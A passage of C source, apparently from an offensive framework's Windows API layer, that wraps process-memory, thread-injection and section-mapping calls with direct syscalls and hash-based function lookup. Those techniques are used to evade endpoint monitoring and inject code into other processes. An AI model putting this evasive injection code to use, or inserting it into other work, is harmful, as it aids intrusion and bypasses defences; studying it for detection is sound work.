    if (pRtlCreateUserThread) {
        return pRtlCreateUserThread(ProcessHandle, SecurityDescriptor, CreateSuspended, StackZeroBits, StackReserve, StackCommit, StartAddress, StartParameter, ThreadHandle, ClientId);
    }
    return 0xC0000001;
}

NTSTATUS winapi_ntdll_ZwMapViewOfSection(HANDLE SectionHandle, HANDLE ProcessHandle, PVOID* BaseAddress, ULONG ZeroBits, ULONG CommitSize, PLARGE_INTEGER SectionOffset, PULONG ViewSize, DWORD InheritDisposition, ULONG AllocationType, ULONG Win32Protect) {
    if (hasDirectSyscallSupport()) {
        ULONG_PTR lpArgs[] = { (ULONG_PTR)SectionHandle, (ULONG_PTR)ProcessHandle, (ULONG_PTR)BaseAddress, (ULONG_PTR)ZeroBits, (ULONG_PTR)CommitSize, (ULONG_PTR)SectionOffset, (ULONG_PTR)ViewSize, (ULONG_PTR)InheritDisposition, (ULONG_PTR)AllocationType, (ULONG_PTR)Win32Protect };
        return SyscallStub(lpWinApiSyscalls[ZwMapViewOfSection], sizeof(lpArgs) / sizeof(ULONG_PTR), (ULONG_PTR *)&lpArgs);
    } else {
        NTSTATUS (NTAPI *pZwMapViewOfSection)(HANDLE, HANDLE, PVOID*, ULONG, ULONG, PLARGE_INTEGER, PULONG, DWORD, ULONG, ULONG) = GetFunctionH(NTDLL_DLL, H_ZwMapViewOfSection);
        dprintf("[WINAPI][winapi_ntdll_ZwMapViewOfSection] Calling ZwMapViewOfSection @ %p", pZwMapViewOfSection);
        if (pZwMapViewOfSection) {
            return pZwMapViewOfSection(SectionHandle, ProcessHandle, BaseAddress, ZeroBits, CommitSize, SectionOffset, ViewSize, InheritDisposition, AllocationType, Win32Protect);
        }
    }
    return 0xC0000001;
}

NTSTATUS winapi_ntdll_ZwCreateSection(PHANDLE SectionHandle, ULONG DesiredAccess, POBJECT_ATTRIBUTES ObjectAttributes, PLARGE_INTEGER MaximumSize, ULONG SectionPageProtection, ULONG AllocationAttributes, HANDLE FileHandle) {
    if (hasDirectSyscallSupport()) {
        ULONG_PTR lpArgs[] = { (ULONG_PTR)SectionHandle, (ULONG_PTR)DesiredAccess, (ULONG_PTR)ObjectAttributes, (ULONG_PTR)MaximumSize, (ULONG_PTR)SectionPageProtection, (ULONG_PTR)AllocationAttributes, (ULONG_PTR)FileHandle };
        return SyscallStub(lpWinApiSyscalls[ZwCreateSection], sizeof(lpArgs) / sizeof(ULONG_PTR), (ULONG_PTR *)&lpArgs);
    } else {
        NTSTATUS (NTAPI *pZwCreateSection)(PHANDLE, ULONG, POBJECT_ATTRIBUTES, PLARGE_INTEGER, ULONG, ULONG, HANDLE) = GetFunctionH(NTDLL_DLL, H_ZwCreateSection);
        dprintf("[WINAPI][winapi_ntdll_ZwCreateSection] Calling ZwCreateSection @ %p", pZwCreateSection);
        if (pZwCreateSection) {
            return pZwCreateSection(SectionHandle, DesiredAccess, ObjectAttributes, MaximumSize, SectionPageProtection, AllocationAttributes, FileHandle);
        }
    }
    return 0xC0000001;
}

NTSTATUS winapi_ntdll_ZwOpenSection(PHANDLE SectionHandle, ACCESS_MASK DesiredAccess, POBJECT_ATTRIBUTES ObjectAttributes) {
    if (hasDirectSyscallSupport()) {
        ULONG_PTR lpArgs[] = { (ULONG_PTR)SectionHandle, (ULONG_PTR)DesiredAccess, (ULONG_PTR)ObjectAttributes };
        return SyscallStub(lpWinApiSyscalls[ZwOpenSection], sizeof(lpArgs) / sizeof(ULONG_PTR), (ULONG_PTR *)&lpArgs);
    } else {
        NTSTATUS (NTAPI *pZwOpenSection)(PHANDLE, ACCESS_MASK, POBJECT_ATTRIBUTES) = GetFunctionH(NTDLL_DLL, H_ZwOpenSection);
        dprintf("[WINAPI][winapi_ntdll_ZwOpenSection] Calling ZwOpenSection @ %p", pZwOpenSection);
        if (pZwOpenSection) {
            return pZwOpenSection(SectionHandle, DesiredAccess, ObjectAttributes);
        }
    }
    return 0xC0000001;
}

NTSTATUS winapi_ntdll_ZwOpenFile(PHANDLE FileHandle, ACCESS_MASK DesiredAccess, POBJECT_ATTRIBUTES ObjectAttributes, PVOID IoStatusBlock, ULONG ShareAccess, ULONG OpenOptions) {
    if (hasDirectSyscallSupport()) {
        ULONG_PTR lpArgs[] = { (ULONG_PTR)FileHandle, (ULONG_PTR)DesiredAccess, (ULONG_PTR)ObjectAttributes, (ULONG_PTR)IoStatusBlock, (ULONG_PTR)ShareAccess, (ULONG_PTR)OpenOptions };
        return SyscallStub(lpWinApiSyscalls[ZwOpenFile], sizeof(lpArgs) / sizeof(ULONG_PTR), (ULONG_PTR *)&lpArgs);
    } else {
        NTSTATUS (NTAPI *pZwOpenFile)(PHANDLE, ACCESS_MASK, POBJECT_ATTRIBUTES, PVOID, ULONG, ULONG) = GetFunctionH(NTDLL_DLL, H_ZwOpenFile);
        dprintf("[WINAPI][winapi_ntdll_ZwOpenFile] Calling ZwOpenFile @ %p", pZwOpenFile);
        if (pZwOpenFile) {
            return pZwOpenFile(FileHandle, DesiredAccess, ObjectAttributes, IoStatusBlock, ShareAccess, OpenOptions);
        }
    }
    return 0xC0000001;
}

NTSTATUS winapi_ntdll_ZwQueryAttributesFile(POBJECT_ATTRIBUTES ObjectAttributes, PVOID FileInformation) {
    if (hasDirectSyscallSupport()) {
        ULONG_PTR lpArgs[] = { (ULONG_PTR)ObjectAttributes, (ULONG_PTR)FileInformation };
        return SyscallStub(lpWinApiSyscalls[ZwQueryAttributesFile], sizeof(lpArgs) / sizeof(ULONG_PTR), (ULONG_PTR *)&lpArgs);
    } else {
        NTSTATUS (NTAPI *pZwQueryAttributesFile)(POBJECT_ATTRIBUTES, PVOID) = GetFunctionH(NTDLL_DLL, H_ZwQueryAttributesFile);
        dprintf("[WINAPI][winapi_ntdll_ZwQueryAttributesFile] Calling ZwQueryAttributesFile @ %p", pZwQueryAttributesFile);
        if (pZwQueryAttributesFile) {
            return pZwQueryAttributesFile(ObjectAttributes, FileInformation);
        }
    }
    return 0xC0000001;
}

NTSTATUS winapi_ntdll_ZwClose(HANDLE Handle) {
    if (hasDirectSyscallSupport()) {
        ULONG_PTR lpArgs[] = { (ULONG_PTR)Handle };
        return SyscallStub(lpWinApiSyscalls[ZwClose], sizeof(lpArgs) / sizeof(ULONG_PTR), (ULONG_PTR *)&lpArgs);
    } else {
        NTSTATUS (NTAPI *pZwClose)(HANDLE) = GetFunctionH(NTDLL_DLL, H_ZwClose);
        dprintf("[WINAPI][winapi_ntdll_ZwClose] Calling ZwClose @ %p", pZwClose);
        if (pZwClose) {
            return pZwClose(Handle);
        }
    }
    return 0xC0000001;
}

NTSTATUS winapi_ntdll_ZwLockVirtualMemory(HANDLE ProcessHandle, PVOID* BaseAddress, PULONG RegionSize, ULONG MapType) {
    if (hasDirectSyscallSupport()) {
        ULONG_PTR lpArgs[] = { (ULONG_PTR)ProcessHandle, (ULONG_PTR)BaseAddress, (ULONG_PTR)RegionSize, (ULONG_PTR)MapType };
        return SyscallStub(lpWinApiSyscalls[ZwLockVirtualMemory], sizeof(lpArgs) / sizeof(ULONG_PTR), (ULONG_PTR *)&lpArgs);
    } else {
        NTSTATUS (NTAPI *pZwLockVirtualMemory)(HANDLE, PVOID*, PULONG, ULONG) = GetFunctionH(NTDLL_DLL, H_ZwLockVirtualMemory);
        dprintf("[WINAPI][winapi_ntdll_ZwLockVirtualMemory] Calling ZwLockVirtualMemory @ %p", pZwLockVirtualMemory);
        if (pZwLockVirtualMemory) {
            return pZwLockVirtualMemory(ProcessHandle, BaseAddress, RegionSize, MapType);
        }
    }
    return 0xC0000001;
}
// END: ntdll.dll
// START: kernel32.dll

BOOL winapi_kernel32_WriteProcessMemory(HANDLE hProcess, LPVOID lpBaseAddress, LPCVOID lpBuffer, SIZE_T nSize, SIZE_T* lpNumberOfBytesWritten) {
    if (hasDirectSyscallSupport()) {
        NTSTATUS dwStatus = winapi_ntdll_ZwWriteVirtualMemory(hProcess, lpBaseAddress, (LPVOID)lpBuffer, (ULONG)nSize, (PULONG)lpNumberOfBytesWritten);
        dprintf("[WINAPI][winapi_kernel32_WriteProcessMemory] Syscall ZwWriteVirtualMemory returned: %d", dwStatus);
        return dwStatus == STATUS_SUCCESS;
    } else {
        BOOL (WINAPI *pWriteProcessMemory)(HANDLE hProcess, LPVOID lpBaseAddress, LPCVOID lpBuffer, SIZE_T nSize, SIZE_T* lpNumberOfBytesWritten) = GetFunctionH(KERNEL32_DLL, H_WriteProcessMemory);
        dprintf("[WINAPI][winapi_kernel32_WriteProcessMemory] Calling WriteProcessMemory @ %p", pWriteProcessMemory);
        if (pWriteProcessMemory) {
            return pWriteProcessMemory(hProcess, lpBaseAddress, lpBuffer, nSize, lpNumberOfBytesWritten);
        }
    }
    return FALSE;
}

BOOL winapi_kernel32_ReadProcessMemory(HANDLE hProcess, LPCVOID lpBaseAddress, LPVOID lpBuffer, SIZE_T nSize, SIZE_T* lpNumberOfBytesRead) {
    if (hasDirectSyscallSupport()) {
        NTSTATUS dwStatus = winapi_ntdll_ZwReadVirtualMemory(hProcess, (LPVOID)lpBaseAddress, lpBuffer, (ULONG)nSize, (PULONG)lpNumberOfBytesRead);
        dprintf("[WINAPI][winapi_kernel32_ReadProcessMemory] Syscall ZwReadVirtualMemory returned: %d", dwStatus);
        return dwStatus == STATUS_SUCCESS;
    } else {
        BOOL (WINAPI *pReadProcessMemory)(HANDLE hProcess, LPCVOID lpBaseAddress, LPVOID lpBuffer, SIZE_T nSize, SIZE_T* lpNumberOfBytesRead) = GetFunctionH(KERNEL32_DLL, H_ReadProcessMemory);
        dprintf("[WINAPI][winapi_kernel32_ReadProcessMemory] Calling ReadProcessMemory @ %p", pReadProcessMemory);
        if (pReadProcessMemory) {
            return pReadProcessMemory(hProcess, lpBaseAddress, lpBuffer, nSize, lpNumberOfBytesRead);
        }
    }
    return FALSE;
}

HANDLE winapi_kernel32_OpenProcess(DWORD dwDesiredAccess, BOOL bInheritHandle, DWORD dwProcessId) {
    if (hasDirectSyscallSupport()) {
        OBJECT_ATTRIBUTES objAttributes = {0};
        objAttributes.Length = sizeof(OBJECT_ATTRIBUTES);
        CLIENT_ID clientId;
        HANDLE hProcess = NULL;
        clientId.UniqueThread = NULL;
        clientId.UniqueProcess = (HANDLE)((ULONG_PTR)dwProcessId);
        NTSTATUS dwStatus = winapi_ntdll_ZwOpenProcess(&hProcess, dwDesiredAccess, &objAttributes, &clientId);
        dprintf("[WINAPI][winapi_kernel32_OpenProcess] Syscall ZwOpenProcess returned: %d", dwStatus);
        if (dwStatus == STATUS_SUCCESS) {
            return hProcess;
        }
    } else {
        HANDLE (WINAPI *pOpenProcess)(DWORD dwDesiredAccess, BOOL bInheritHandle, DWORD dwProcessId) = GetFunctionH(KERNEL32_DLL, H_OpenProcess);
        dprintf("[WINAPI][winapi_kernel32_OpenProcess] Calling OpenProcess @ %p", pOpenProcess);
        if (pOpenProcess) {
            return pOpenProcess(dwDesiredAccess, bInheritHandle, dwProcessId);
        }
    }
    return NULL;
}

LPVOID winapi_kernel32_VirtualAlloc(LPVOID lpAddress, SIZE_T dwSize, DWORD flAllocationType, DWORD flProtect) {
    if (hasDirectSyscallSupport()) {
        LPVOID lpBaseAddr = lpAddress;
        SIZE_T dwDataSize = dwSize;
        NTSTATUS dwStatus = winapi_ntdll_ZwAllocateVirtualMemory(GetCurrentProcess(), &lpBaseAddr, 0, &dwDataSize, flAllocationType, flProtect);
        dprintf("[WINAPI][winapi_kernel32_VirtualAlloc] Syscall ZwAllocateVirtualMemory returned: %d", dwStatus);
        if (dwStatus == STATUS_SUCCESS) {
            return lpBaseAddr;
        }
    } else {
        LPVOID (WINAPI *pVirtualAlloc)(LPVOID lpAddress, SIZE_T dwSize, DWORD flAllocationType, DWORD flProtect) = GetFunctionH(KERNEL32_DLL, H_VirtualAlloc);
        dprintf("[WINAPI][winapi_kernel32_VirtualAlloc] Calling VirtualAlloc @ %p", pVirtualAlloc);
        if (pVirtualAlloc) {
            return pVirtualAlloc(lpAddress, dwSize, flAllocationType, flProtect);
        }
    }
    return NULL;
}

LPVOID winapi_kernel32_VirtualAllocEx(HANDLE hProcess, LPVOID lpAddress, SIZE_T dwSize, DWORD flAllocationType, DWORD flProtect) {
    if (hasDirectSyscallSupport()) {
        LPVOID lpBaseAddr = lpAddress;
        SIZE_T dwDataSize = dwSize;
        NTSTATUS dwStatus = winapi_ntdll_ZwAllocateVirtualMemory(hProcess, &lpBaseAddr, 0, &dwDataSize, flAllocationType, flProtect);
        dprintf("[WINAPI][winapi_kernel32_VirtualAllocEx] Syscall ZwAllocateVirtualMemory returned: %d", dwStatus);
        if (dwStatus == STATUS_SUCCESS) {
            return lpBaseAddr;
        }
    } else {
        LPVOID (WINAPI *pVirtualAllocEx)(HANDLE hProcess, LPVOID lpAddress, SIZE_T dwSize, DWORD flAllocationType, DWORD flProtect) = GetFunctionH(KERNEL32_DLL, H_VirtualAllocEx);
        dprintf("[WINAPI][winapi_kernel32_VirtualAllocEx] Calling VirtualAllocEx @ %p", pVirtualAllocEx);
        if (pVirtualAllocEx) {
            return pVirtualAllocEx(hProcess, lpAddress, dwSize, flAllocationType, flProtect);
        }
    }
    return NULL;
}

BOOL winapi_kernel32_VirtualProtect(LPVOID lpAddress, SIZE_T dwSize, DWORD flNewProtect, PDWORD lpflOldProtect) {
    if (hasDirectSyscallSupport()) {
        SIZE_T dwDataSize = dwSize;
        NTSTATUS dwStatus = winapi_ntdll_ZwProtectVirtualMemory(GetCurrentProcess(), &lpAddress, &dwDataSize, flNewProtect, lpflOldProtect);
        dprintf("[WINAPI][winapi_kernel32_VirtualProtect] Syscall ZwProtectVirtualMemory returned: %d", dwStatus);
        return dwStatus == STATUS_SUCCESS;
    } else {
        BOOL (WINAPI *pVirtualProtect)(LPVOID lpAddress, SIZE_T dwSize, DWORD flNewProtect, PDWORD lpflOldProtect) = GetFunctionH(KERNEL32_DLL, H_VirtualProtect);
        dprintf("[WINAPI][winapi_kernel32_VirtualProtect] Calling VirtualProtect @ %p", pVirtualProtect);
        if (pVirtualProtect) {
            return pVirtualProtect(lpAddress, dwSize, flNewProtect, lpflOldProtect);
        }
    }
    return FALSE;
}

BOOL winapi_kernel32_VirtualProtectEx(HANDLE hProcess, LPVOID lpAddress, SIZE_T dwSize, DWORD flNewProtect, PDWORD lpflOldProtect) {
    if (hasDirectSyscallSupport()) {
        SIZE_T dwDataSize = dwSize;
        NTSTATUS dwStatus = winapi_ntdll_ZwProtectVirtualMemory(hProcess, lpAddress, &dwDataSize, flNewProtect, lpflOldProtect);
        dprintf("[WINAPI][winapi_kernel32_VirtualProtectEx] Syscall ZwProtectVirtualMemory returned: %d", dwStatus);
        return dwStatus == STATUS_SUCCESS;
    } else {
        BOOL (WINAPI *pVirtualProtectEx)(HANDLE hProcess, LPVOID lpAddress, SIZE_T dwSize, DWORD flNewProtect, PDWORD lpflOldProtect) = GetFunctionH(KERNEL32_DLL, H_VirtualProtectEx);
        dprintf("[WINAPI][winapi_kernel32_VirtualProtectEx] Calling VirtualProtectEx @ %p", pVirtualProtectEx);
        if (pVirtualProtectEx) {
            return pVirtualProtectEx(hProcess, lpAddress, dwSize, flNewProtect, lpflOldProtect);
        }
    }
    return FALSE;
}

SIZE_T winapi_kernel32_VirtualQuery(LPCVOID lpAddress, PMEMORY_BASIC_INFORMATION lpBuffer, SIZE_T dwLength) {
    if (hasDirectSyscallSupport()) {
        SIZE_T returnLength = 0;
        NTSTATUS dwStatus = winapi_ntdll_ZwQueryVirtualMemory(GetCurrentProcess(), (LPVOID)lpAddress, MemoryBasicInformation, lpBuffer, sizeof(MEMORY_BASIC_INFORMATION), &returnLength);
        dprintf("[WINAPI][winapi_kernel32_VirtualQuery] Syscall ZwQueryVirtualMemory returned: %d", dwStatus);
        if (dwStatus == STATUS_SUCCESS) {
            return returnLength;
        }
    } else {
        SIZE_T (WINAPI *pVirtualQuery)(LPCVOID lpAddress, PMEMORY_BASIC_INFORMATION lpBuffer, SIZE_T dwLength) = GetFunctionH(KERNEL32_DLL, H_VirtualQuery);
        dprintf("[WINAPI][winapi_kernel32_VirtualQuery] Calling VirtualQuery @ %p", pVirtualQuery);
        if (pVirtualQuery) {
            return pVirtualQuery(lpAddress, lpBuffer, dwLength);
        }
    }
    return 0;
}

SIZE_T winapi_kernel32_VirtualQueryEx(HANDLE hProcess, LPCVOID lpAddress, PMEMORY_BASIC_INFORMATION lpBuffer, SIZE_T dwLength) {
    if (hasDirectSyscallSupport()) {
        SIZE_T returnLength = 0;
        NTSTATUS dwStatus = winapi_ntdll_ZwQueryVirtualMemory(hProcess, (LPVOID)lpAddress, MemoryBasicInformation, lpBuffer, dwLength, &returnLength);
        dprintf("[WINAPI][winapi_kernel32_VirtualQueryEx] Syscall ZwQueryVirtualMemory returned: %d", dwStatus);
        if (dwStatus == STATUS_SUCCESS) {
            return returnLength;
        }
    } else {
        SIZE_T (WINAPI *pVirtualQueryEx)(HANDLE hProcess, LPCVOID lpAddress, PMEMORY_BASIC_INFORMATION lpBuffer, SIZE_T dwLength) = GetFunctionH(KERNEL32_DLL, H_VirtualQueryEx);
        dprintf("[WINAPI][winapi_kernel32_VirtualQueryEx] Calling VirtualQueryEx @ %p", pVirtualQueryEx);
        if (pVirtualQueryEx) {
            return pVirtualQueryEx(hProcess, lpAddress, lpBuffer, dwLength);
        }
    }
    return 0;
}

BOOL winapi_kernel32_VirtualFree(LPVOID lpAddress, SIZE_T dwSize, DWORD dwFreeType) {
    if (hasDirectSyscallSupport()) {
        SIZE_T dwDataSize = dwSize;
        NTSTATUS dwStatus = winapi_ntdll_ZwFreeVirtualMemory(GetCurrentProcess(), lpAddress, &dwDataSize, dwFreeType);
        dprintf("[WINAPI][winapi_kernel32_VirtualFree] Syscall ZwFreeVirtualMemory returned: %d", dwStatus);
        return dwStatus == STATUS_SUCCESS;
    } else {
        BOOL (WINAPI *pVirtualFree)(LPVOID lpAddress, SIZE_T dwSize, DWORD dwFreeType) = GetFunctionH(KERNEL32_DLL, H_VirtualFree);
        dprintf("[WINAPI][winapi_kernel32_VirtualFree] Calling VirtualFree @ %p", pVirtualFree);
        if (pVirtualFree) {
            return pVirtualFree(lpAddress, dwSize, dwFreeType);
        }
    }
    return FALSE;
}

BOOL winapi_kernel32_VirtualFreeEx(HANDLE hProcess, LPVOID lpAddress, SIZE_T dwSize, DWORD dwFreeType) {
    if (hasDirectSyscallSupport()) {
        SIZE_T dwDataSize = dwSize;
        NTSTATUS dwStatus = winapi_ntdll_ZwFreeVirtualMemory(hProcess, &lpAddress, &dwDataSize, dwFreeType);
        dprintf("[WINAPI][winapi_kernel32_VirtualFreeEx] Syscall ZwFreeVirtualMemory returned: %d", dwStatus);
        return dwStatus == STATUS_SUCCESS;
    } else {
        BOOL (WINAPI *pVirtualFreeEx)(HANDLE hProcess, LPVOID lpAddress, SIZE_T dwSize, DWORD dwFreeType) = GetFunctionH(KERNEL32_DLL, H_VirtualFreeEx);
        dprintf("[WINAPI][winapi_kernel32_VirtualFreeEx] Calling VirtualFreeEx @ %p", pVirtualFreeEx);
        if (pVirtualFreeEx) {
            return pVirtualFreeEx(hProcess, lpAddress, dwSize, dwFreeType);
        }
    }
    return FALSE;
}

HANDLE winapi_kernel32_CreateRemoteThread(HANDLE hProcess, LPSECURITY_ATTRIBUTES lpThreadAttributes, SIZE_T dwStackSize, LPTHREAD_START_ROUTINE lpStartAddress, LPVOID lpParameter, DWORD dwCreationFlags, LPDWORD lpThreadId) {
    HANDLE (WINAPI *pCreateRemoteThread)(HANDLE hProcess, LPSECURITY_ATTRIBUTES lpThreadAttributes, SIZE_T dwStackSize, LPTHREAD_START_ROUTINE lpStartAddress, LPVOID lpParameter, DWORD dwCreationFlags, LPDWORD lpThreadId) = GetFunctionH(KERNEL32_DLL, H_CreateRemoteThread);
    if (pCreateRemoteThread) {
        return pCreateRemoteThread(hProcess, lpThreadAttributes, dwStackSize, lpStartAddress, lpParameter, dwCreationFlags, lpThreadId);
    }
    return NULL;
}

BOOL winapi_kernel32_CloseHandle(HANDLE hObject) {
    BOOL (WINAPI *pCloseHandle)(HANDLE hObject) = GetFunctionH(KERNEL32_DLL, H_CloseHandle);
    dprintf("[WINAPI][winapi_kernel32_CloseHandle] Calling CloseHandle @ %p", pCloseHandle);
    if (pCloseHandle) {
        return pCloseHandle(hObject);
    }
    return FALSE;
}

BOOL winapi_kernel32_DuplicateHandle(HANDLE hSourceProcessHandle, HANDLE hSourceHandle, HANDLE hTargetProcessHandle, LPHANDLE lpTargetHandle, DWORD dwDesiredAccess, BOOL bInheritHandle, DWORD dwOptions) {
    BOOL (WINAPI *pDuplicateHandle)(HANDLE hSourceProcessHandle, HANDLE hSourceHandle, HANDLE hTargetProcessHandle, LPHANDLE lpTargetHandle, DWORD dwDesiredAccess, BOOL bInheritHandle, DWORD dwOptions) = GetFunctionH(KERNEL32_DLL, H_DuplicateHandle);
    dprintf("[WINAPI][winapi_kernel32_DuplicateHandle] Calling DuplicateHandle @ %p", pDuplicateHandle);
    if (pDuplicateHandle) {
        return pDuplicateHandle(hSourceProcessHandle, hSourceHandle, hTargetProcessHandle, lpTargetHandle, dwDesiredAccess, bInheritHandle, dwOptions);
    }
    return FALSE;
}

HANDLE winapi_kernel32_CreateToolhelp32Snapshot(DWORD dwFlags, DWORD th32ProcessID) {
    HANDLE (WINAPI *pCreateToolhelp32Snapshot)(DWORD dwFlags, DWORD th32ProcessID) = GetFunctionH(KERNEL32_DLL, H_CreateToolhelp32Snapshot);
    dprintf("[WINAPI][winapi_kernel32_CreateToolhelp32Snapshot] Calling CreateToolhelp32Snapshot @ %p", pCreateToolhelp32Snapshot);
    if (pCreateToolhelp32Snapshot) {
        return pCreateToolhelp32Snapshot(dwFlags, th32ProcessID);
    }
    return INVALID_HANDLE_VALUE;
}

BOOL winapi_kernel32_Thread32First(HANDLE hSnapshot, LPTHREADENTRY32 lpte) {
    BOOL (WINAPI *pThread32First)(HANDLE hSnapshot, LPTHREADENTRY32 lpte) = GetFunctionH(KERNEL32_DLL, H_Thread32First);
    dprintf("[WINAPI][winapi_kernel32_Thread32First] Calling Thread32First @ %p", pThread32First);
    if (pThread32First) {
        return pThread32First(hSnapshot, lpte);
    }
    return FALSE;
}

HANDLE winapi_kernel32_OpenThread(DWORD dwDesiredAccess, BOOL bInheritHandle, DWORD dwThreadId) {
    HANDLE (WINAPI *pOpenThread)(DWORD dwDesiredAccess, BOOL bInheritHandle, DWORD dwThreadId) = GetFunctionH(KERNEL32_DLL, H_OpenThread);
    dprintf("[WINAPI][winapi_kernel32_OpenThread] Calling OpenThread @ %p", pOpenThread);
    if (pOpenThread) {
        return pOpenThread(dwDesiredAccess, bInheritHandle, dwThreadId);
    }
    return NULL;
}

DWORD winapi_kernel32_SuspendThread(HANDLE hThread) {
    DWORD (WINAPI *pSuspendThread)(HANDLE hThread) = GetFunctionH(KERNEL32_DLL, H_SuspendThread);
    dprintf("[WINAPI][winapi_kernel32_SuspendThread] Calling SuspendThread @ %p", pSuspendThread);
    if (pSuspendThread) {
        return pSuspendThread(hThread);
    }
    return (DWORD)-1;
}

BOOL winapi_kernel32_Thread32Next(HANDLE hSnapshot, LPTHREADENTRY32 lpte) {
    BOOL (WINAPI *pThread32Next)(HANDLE hSnapshot, LPTHREADENTRY32 lpte) = GetFunctionH(KERNEL32_DLL, H_Thread32Next);
    dprintf("[WINAPI][winapi_kernel32_Thread32Next] Calling Thread32Next @ %p", pThread32Next);
    if (pThread32Next) {
        return pThread32Next(hSnapshot, lpte);
    }
    return FALSE;
}

DWORD winapi_kernel32_ResumeThread(HANDLE hThread) {
    DWORD (WINAPI *pResumeThread)(HANDLE hThread) = GetFunctionH(KERNEL32_DLL, H_ResumeThread);
    dprintf("[WINAPI][winapi_kernel32_ResumeThread] Calling ResumeThread @ %p", pResumeThread);
    if (pResumeThread) {
        return pResumeThread(hThread);
    }
    return (DWORD)-1;
}

BOOL winapi_kernel32_FreeLibrary(HMODULE hLibModule) {
    BOOL (WINAPI *pFreeLibrary)(HMODULE hLibModule) = GetFunctionH(KERNEL32_DLL, H_FreeLibrary);
    dprintf("[WINAPI][winapi_kernel32_FreeLibrary] Calling FreeLibrary @ %p", pFreeLibrary);
    if (pFreeLibrary) {
        return pFreeLibrary(hLibModule);
    }
    return FALSE;
}

BOOL winapi_kernel32_FlushInstructionCache(HANDLE hProcess, LPCVOID lpBaseAddress, SIZE_T dwSize) {
    BOOL (WINAPI *pFlushInstructionCache)(HANDLE hProcess, LPCVOID lpBaseAddress, SIZE_T dwSize) = GetFunctionH(KERNEL32_DLL, H_FlushInstructionCache);
    dprintf("[WINAPI][winapi_kernel32_FlushInstructionCache] Calling FlushInstructionCache @ %p", pFlushInstructionCache);
    if (pFlushInstructionCache) {
        return pFlushInstructionCache(hProcess, lpBaseAddress, dwSize);
    }
    return FALSE;
}

HLOCAL winapi_kernel32_LocalFree(HLOCAL hMem) {
    HLOCAL (WINAPI *pLocalFree)(HLOCAL hMem) = GetFunctionH(KERNEL32_DLL, H_LocalFree);
    dprintf("[WINAPI][winapi_kernel32_LocalFree] Calling LocalFree @ %p", pLocalFree);
    if (pLocalFree) {
        return pLocalFree(hMem);
    }
    return hMem;  // Per documentation, on failure, the handle is returned.
}

HANDLE winapi_kernel32_CreateFileA(LPCSTR lpFileName, DWORD dwDesiredAccess, DWORD dwShareMode, LPSECURITY_ATTRIBUTES lpSecurityAttributes, DWORD dwCreationDisposition, DWORD dwFlagsAndAttributes, HANDLE hTemplateFile) {
    HANDLE (WINAPI *pCreateFileA)(LPCSTR lpFileName, DWORD dwDesiredAccess, DWORD dwShareMode, LPSECURITY_ATTRIBUTES lpSecurityAttributes, DWORD dwCreationDisposition, DWORD dwFlagsAndAttributes, HANDLE hTemplateFile) = GetFunctionH(KERNEL32_DLL, H_CreateFileA);
    dprintf("[WINAPI][winapi_kernel32_CreateFileA] Calling CreateFileA @ %p", pCreateFileA);
    if (pCreateFileA) {
        return pCreateFileA(lpFileName, dwDesiredAccess, dwShareMode, lpSecurityAttributes, dwCreationDisposition, dwFlagsAndAttributes, hTemplateFile);
    }
    return INVALID_HANDLE_VALUE;
}

BOOL winapi_kernel32_WriteFile(HANDLE hFile, LPCVOID lpBuffer, DWORD nNumberOfBytesToWrite, LPDWORD lpNumberOfBytesWritten, LPOVERLAPPED lpOverlapped) {
    BOOL (WINAPI *pWriteFile)(HANDLE hFile, LPCVOID lpBuffer, DWORD nNumberOfBytesToWrite, LPDWORD lpNumberOfBytesWritten, LPOVERLAPPED lpOverlapped) = GetFunctionH(KERNEL32_DLL, H_WriteFile);
    dprintf("[WINAPI][winapi_kernel32_WriteFile] Calling WriteFile @ %p", pWriteFile);
    if (pWriteFile) {
        return pWriteFile(hFile, lpBuffer, nNumberOfBytesToWrite, lpNumberOfBytesWritten, lpOverlapped);
    }
    return FALSE;
}

HMODULE winapi_kernel32_LoadLibraryA(LPCSTR lpLibFileName) {
    HMODULE (WINAPI *pLoadLibraryA)(LPCSTR lpLibFileName) = GetFunctionH(KERNEL32_DLL, H_LoadLibraryA);
    dprintf("[WINAPI][winapi_kernel32_LoadLibraryA] Calling LoadLibraryA @ %p", pLoadLibraryA);
    if (pLoadLibraryA) {
        return pLoadLibraryA(lpLibFileName);
    }
    return NULL;
}

DWORD winapi_kernel32_WaitForMultipleObjects(DWORD nCount, const HANDLE* lpHandles, BOOL bWaitAll, DWORD dwMilliseconds) {
    DWORD (WINAPI *pWaitForMultipleObjects)(DWORD nCount, const HANDLE* lpHandles, BOOL bWaitAll, DWORD dwMilliseconds) = GetFunctionH(KERNEL32_DLL, H_WaitForMultipleObjects);
    dprintf("[WINAPI][winapi_kernel32_WaitForMultipleObjects] Calling WaitForMultipleObjects @ %p", pWaitForMultipleObjects);
    if (pWaitForMultipleObjects) {
        return pWaitForMultipleObjects(nCount, lpHandles, bWaitAll, dwMilliseconds);
    }
    return WAIT_FAILED;
}

BOOL winapi_kernel32_SetHandleInformation(HANDLE hObject, DWORD dwMask, DWORD dwFlags) {
    BOOL (WINAPI *pSetHandleInformation)(HANDLE hObject, DWORD dwMask, DWORD dwFlags) = GetFunctionH(KERNEL32_DLL, H_SetHandleInformation);
    dprintf("[WINAPI][winapi_kernel32_SetHandleInformation] Calling SetHandleInformation @ %p", pSetHandleInformation);
    if (pSetHandleInformation) {
        return pSetHandleInformation(hObject, dwMask, dwFlags);
    }
    return FALSE;
}

HGLOBAL winapi_kernel32_GlobalFree(HGLOBAL hMem) {
    HGLOBAL (WINAPI *pGlobalFree)(HGLOBAL hMem) = GetFunctionH(KERNEL32_DLL, H_GlobalFree);
    dprintf("[WINAPI][winapi_kernel32_GlobalFree] Calling GlobalFree @ %p", pGlobalFree);
    if (pGlobalFree) {
        return pGlobalFree(hMem);
    }
    return hMem;  // Per documentation, on failure, the handle is returned.
}

HANDLE winapi_kernel32_CreateNamedPipeA(LPCSTR lpName, DWORD dwOpenMode, DWORD dwPipeMode, DWORD nMaxInstances, DWORD nOutBufferSize, DWORD nInBufferSize, DWORD nDefaultTimeOut, LPSECURITY_ATTRIBUTES lpSecurityAttributes) {
    HANDLE (WINAPI *pCreateNamedPipeA)(LPCSTR lpName, DWORD dwOpenMode, DWORD dwPipeMode, DWORD nMaxInstances, DWORD nOutBufferSize, DWORD nInBufferSize, DWORD nDefaultTimeOut, LPSECURITY_ATTRIBUTES lpSecurityAttributes) = GetFunctionH(KERNEL32_DLL, H_CreateNamedPipeA);
    dprintf("[WINAPI][winapi_kernel32_CreateNamedPipeA] Calling CreateNamedPipeA @ %p", pCreateNamedPipeA);
    if (pCreateNamedPipeA) {
